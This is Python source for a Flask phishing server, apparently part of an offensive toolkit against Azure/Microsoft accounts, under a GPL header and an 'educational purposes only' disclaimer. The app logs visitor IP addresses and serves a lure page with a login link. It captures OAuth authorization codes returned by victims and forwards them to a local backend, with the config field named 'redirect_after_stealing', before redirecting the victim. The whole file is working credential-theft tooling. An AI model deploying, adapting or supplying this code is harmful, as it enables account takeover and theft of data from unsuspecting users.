# Copyright (C) 2022 Raunak Parmar, @trouble1_raunak
# All rights reserved to Raunak Parmar

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

# This tool is meant for educational purposes only. 
# The creator takes no responsibility of any mis-use of this tool.

from flask import Flask
import flask
from flask import url_for
from flask.templating import render_template
import requests
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.sql import text
from sqlalchemy.sql.expression import true
from werkzeug.utils import redirect
from flask import request
import ssl, sys, os

phish = Flask(__name__, template_folder="phishTemplate", static_folder='phishStatic')
phish.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
phish.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(phish)

@phish.route("/")
def home():
    ip = request.remote_addr
    db.engine.execute(text("INSERT OR IGNORE INTO  visitors(ip) VALUES(:ip)"), ip=ip)
    if "code" in flask.request.args:
        try:
            code = flask.request.args['code']        
            
            requests.get("http://localhost:8000/azure/getcode?code="+code)
            redirect_after_stealing = db.engine.execute(text("SELECT redirect_after_stealing from stealer_config")).fetchall()[-1][-1]
            if redirect_after_stealing != "":
                return redirect(redirect_after_stealing)
            else:
                return redirect("/")    
        except Exception as e:
            print(e)

    url = db.engine.execute(text("SELECT phishUrl from stealer_config")).fetchall()[-1][-1]

    return render_template("index.html", LOGINURL=url)

if __name__ == '__main__':
    port = db.engine.execute("SELECT port from stealer_config where uuid = :uuid", uuid=sys.argv[1]).fetchall()[-1][-1]
    sslFiles = db.engine.execute(text("SELECT publicname, keyname from ssl_cert")).fetchall()
    if port == "":
        port = 80
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    BASE_PATH = os.path.dirname(os.path.realpath(__file__))
    try:
        cert = BASE_PATH + "/ssl/" + sslFiles[0][0]
        key = BASE_PATH + "/ssl/" + sslFiles[0][1]
    except:
        cert = BASE_PATH + "/ssl/default.crt"
        key = BASE_PATH + "/ssl/default.key"
            
    context.load_cert_chain(cert, key)
    if port != 443:
        phish.run(host='0.0.0.0', port=port, debug=true)
    else:
        phish.run(host='0.0.0.0', port=port, ssl_context=context, debug=true)


